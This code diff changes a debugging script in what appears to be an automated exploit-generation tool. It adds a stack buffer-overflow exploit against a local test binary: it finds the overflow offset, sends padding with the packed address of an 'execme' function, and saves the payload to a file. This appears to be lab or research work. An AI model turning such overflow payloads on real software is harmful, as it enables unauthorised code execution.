@@ -1,3 +1,11 @@
+from pwngen.cmd.cli import CLI
+
+app = CLI()
+
+exit(app.cli())
+
+# IGNORE, Debugging things
+
 import time
 from pwngen.logic.graph import Graph
 from pwngen.logic.sast import SAST
@@ -6,15 +14,20 @@ from pwngen.parsers.pwnable import Vulnerabilities
 from pycparser import parse_file, c_ast
 import json
 
+from pwn import *
+
 from pwngen.pwn.debugger import Debugger
 from pwngen.pwn.exploit import Exploit
 
 
 # exp = Exploit("code/babybof.o", delay=0.5)
 # exp._dbg.set_breakpoint("get_input", False)
-exp = Exploit("code/agenda.o", addr="localhost", port=54471, delay=1)
+exp = Exploit("code/agenda.o", addr="localhost", port=54471, delay=2)
+print(p32(exp._dbg._elf.symbols['exit'], endian="little"))
+print(p32(exp._dbg._elf.symbols['execme'], endian="little"))
 exp._dbg.set_breakpoint("fork")
 exp._dbg.set_breakpoint("list_events")
+
 exp._dbg.finish_breakpoint()
 
 
@@ -35,15 +48,37 @@ print("C")
 print("D")
 # time.sleep(2)
 # exp._dbg.continue_until("list_events")
-exp.sendline("list")
+exp.sendline(b"list")
 exp._dbg.finish_breakpoint()
 exp._dbg._exec_gdb("inferior 2")
-time.sleep(5)
 exp._dbg.send_custom_cyclic(512, f"add {'A'*40} {'A'*40} {'A'*40} ")
 # print("B")
 exp._dbg.send_custom_cyclic(512, f"add {'A'*40} {'A'*40} {'A'*40} ")
-exp.sendline("list")
-print(exp.search_bof("list_events", False))
+exp.sendline(b"list")
+offset = exp.search_bof("list_events", False)
+print("OFFSET =", offset)
+exp._dbg._exec_gdb("inferior 1")
+exp._dbg.delete_breakpoints()
+# exp._dbg.set_breakpoint("execme")
+
+exp._dbg.reconnect()
+exp._dbg._gdb.continue_nowait()
+exp._dbg._exec_gdb("inferior 3")
+exp._dbg._gdb.continue_nowait()
+exp._dbg.sendline(f"add {'A'*40} {'A'*40} {'A'*40} {'A'*512}".encode())
+exp._dbg.sendline(f"add {'A'*40} {'A'*40} {'A'*40} {'A'*512}".encode())
+
+exp.sendline(b"add " + b"A"*40 + b" " + b"A"*40 + b" " + b"A"*40 + b" " + b"A"*offset + p32(exp._dbg._elf.symbols['execme'], endian="little") + p32(exp._dbg._elf.symbols['execme'], endian="little"))
+exp.sendline(b"list")
+
+with open("payload.txt", "wb") as f:
+    f.write(f"add {'A'*40} {'A'*40} {'A'*40} {'A'*512}\n".encode())
+    f.write(f"add {'A'*40} {'A'*40} {'A'*40} {'A'*512}\n".encode())
+    f.write(b"add " + b"A"*40 + b" " + b"A"*40 + b" " + b"A"*40 + b" " + b"A"*offset + p32(exp._dbg._elf.symbols['execme'], endian="little") + p32(exp._dbg._elf.symbols['execme'], endian="little") + p32(exp._dbg._elf.symbols['execme'], endian="little") + p32(exp._dbg._elf.symbols['execme'], endian="little") + b"\n")
+    f.write(b"list\n")
+
+print(exp._dbg.recvline())
+print(exp._dbg.recvall())
 
 # exp._dbg.finish_breakpoint()
 print("C")
@@ -54,10 +89,6 @@ print("E")
 # exp._dbg._exec_gdb("break thread 2")
 # exp.sendline("list")
 
-# exp._dbg.continue_until("list_events","sprintf")
-exp._dbg.get_bt()
-# exp._dbg._threads[1].switch()
-exp._dbg.get_bt()
 
 # print(exp._dbg._gdb.inferiors())
 # print(exp._dbg._gdb.selected_inferior())
